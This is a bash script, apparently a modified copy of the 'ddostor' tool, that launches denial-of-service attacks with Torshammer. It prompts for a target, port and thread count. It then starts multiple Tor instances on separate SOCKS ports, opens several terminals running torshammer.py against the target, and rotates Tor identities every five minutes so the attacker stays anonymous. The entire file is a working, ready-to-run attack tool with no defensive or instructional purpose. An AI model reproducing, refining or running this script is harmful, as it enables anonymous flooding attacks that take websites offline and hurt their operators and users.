#!/bin/bash
# ddostor: DDoS Tool v1.5 using Torshammer
# Coded by @thelinuxchoice
# Github: https://github.com/thelinuxchoice/ddostor
# Modificado por Lionsa-G

trap 'printf "\n";stop;exit 1' 2

changeip() {


killall -HUP tor

}

banner() {

read -p" ██╗░░░██╗███████╗███╗░░██╗░██████╗░░█████╗░███╗░░██╗███████╗░█████╗░"
read -p " ██║░░░██║██╔════╝████╗░██║██╔════╝░██╔══██╗████╗░██║╚════██║██╔══██╗"
read -p " ╚██ ░██╔╝█████╗░░██╔██╗██║██║░░██╗░███████║██╔██╗██║░░███╔═╝███████║"
read -p " ░╚████╔╝░██╔══╝░░██║╚████║██║░░╚██╗██╔══██║██║╚████║██╔══╝░░██╔══██║"
read -p " ░░╚██╔╝░░███████╗██║░╚███║╚██████╔╝██║░░██║██║░╚███║███████╗██║░░██║"
read -p " ░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝"



printf     "\e[1;31m 𝖑𝖚𝖈𝖍𝖆 𝖕𝖔𝖗 𝖙𝖚 𝖑𝖎𝖇𝖊𝖗𝖙𝖆𝖉  \e[1;31m"

printf "\e[1;37m . \e[0m\e[1;31m By̷ ̷L̷i̷o̷n̷s̷a̷-̷G̷ <3 \e[0m\e[1;37m .  \e[0m\n\n"
 

printf "\e[0;31m 𝔏𝔦𝔬𝔫𝔰𝔞-𝔊 𝔱𝔢 𝔯𝔢𝔰𝔭𝔞𝔩𝔡𝔞  \e[0m\n"

}

config() {
default_portt="80"
default_threads="600"

default_tor="y"
read -p " ¿𝖊𝖘𝖙𝖆𝖘 𝖑𝖎𝖘𝖙𝖔? ? >> " 
printf "\e[1;36m 𝕼𝖚𝖊 𝖈𝖔𝖒𝖎𝖊𝖓𝖈𝖊 𝖊𝖘𝖙𝖆 𝖘𝖍𝖎𝖙  \e[0m\n"
read -p $'\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m] Target: \e[0m' target
read -p $'\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m] Port \e[0m\e[0;31m(Default 80): \e[0m' portt
portt="${portt:-${default_portt}}"
read -p $'\e[1;31m[\e[0m\e[1;31m*\e[0m\e[1;31m] Threads: \e[0m\e[0;31m(Default 600): \e[0m' threads
threads="${threads:-${default_threads}}"

inst="${inst:-${default_inst}}"
read -e -p $'\e[1;31m[\e[0m\e[1;31m?\e[0m\e[1;31m] 𝖉𝖊𝖘𝖊𝖆 𝖆𝖓𝖔𝖓𝖎𝖒𝖆to via tor?   \e[0m'   tor 
printf "\e[0m"
tor="${tor:-${default_tor}}"
if [[ $tor == "y" || $tor == "Y" ]]; then
readinst
printf "\e[1;31m[*] Press Ctrl + C to stop attack \e[0m \n"
attacktor
else
attack
fi
}



readinst() {
default_inst="3"
read -p $'\e[1;31m[\e[0m\e[1;31m*\e[0m\e[1;31m] Terminales \e[0m\e[1;31m(default: 3): \e[0m' inst
inst="${inst:-${default_inst}}"
multitor
}


attacktor() {
#let i=1
while true; do
  let ii=1
  while [ $ii -le $inst ]; do
porttor=$((9050+$ii))
#printf "\e[1;92m[*] Attack through Tor Port: %s\e[0m\n" $porttor
gnome-terminal -- torsocks -P $porttor python torshammer/torshammer.py -t $target -p $portt -r $threads
ii=$((ii+1))
done
sleep 300
changeip
killall python
let i=1
let porttor=$((9050+$i))
done
}

attack() {
default_inst="4"
read -p $'\e[1;31m[\e[0m\e[1;31m*\e[0m\e[1;31m] Terminals \e[0m\e[1;77m(Default 4): \e[0m' inst
inst="${inst:-${default_inst}}"
printf "\e[0;31m[*] Press Ctrl + C to stop attack \e[0m \n"
i=1
while true; do
  let i=1
  while [[ $i -le $inst ]]; do

gnome-terminal -- python torshammer/torshammer.py -t $target -p $portt -r $threads
i=$((i+1))
done
sleep 300
killall python
done
}

checktor() {
let i=1
checkcount=0 
while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "\e[1;31m[\e[0m\e[1;31m*\e[0m\e[1;31m] Checking Tor connection on port:\e[0m\e[0;31m %s\e[0m..." $port

check=$(curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null; echo $?) 
if [[ "$check" -gt 0 ]]; then 
printf "\e[1;91mFAIL!\e[0m\n" 
else 
printf "\e[1;92mOK!\e[0m\n" 
let checkcount++ 
fi
i=$((i+1))
done

if [[ $checkcount != $inst ]]; then
printf "\e[1;93m[!] It requires all tor running!\e[0m\n"
printf "\e[1;77m1) Check again\e[0m\n"
printf "\e[1;77m2) Restart\n\e[0m"
printf "\e[1;77m2) Exit\n\e[0m"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' fail  


if [[ $fail == "1" ]]; then
checktor
elif [[ $fail == "2" ]]; then
stop
multitor
elif [[ $fail == "3" ]]; then
exit 1
else
printf "\e[1;93m[!] Invalid option, exiting...!\e[0m\n"
exit 1
fi
fi
}

multitor() {


if [[ ! -d multitor ]]; then 
mkdir multitor;
fi
default_ins="1"
inst="${inst:-${default_inst}}"

let i=1
while [[ $i -le $inst ]]; do
port=$((9050+$i))
printf "SOCKSPort %s\nDataDirectory /var/lib/tor%s" $port $i > multitor/multitor$i 
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Tor on port:\e[0m\e[1;77m 905%s\e[0m\n" $i 
tor -f multitor/multitor$i > /dev/null &
sleep 10
i=$((i+1))
done
checktor
}

stop() {

killall -2 tor > /dev/null 2>&1
printf "\e[0;31m[*] 𝕕𝕖𝕥𝕖𝕟𝕚𝕖𝕟𝕕𝕠 𝕒𝕥𝕒𝕢𝕦𝕖 𝔻𝔻𝕠𝕤  \e[0m\n"
}

banner
config


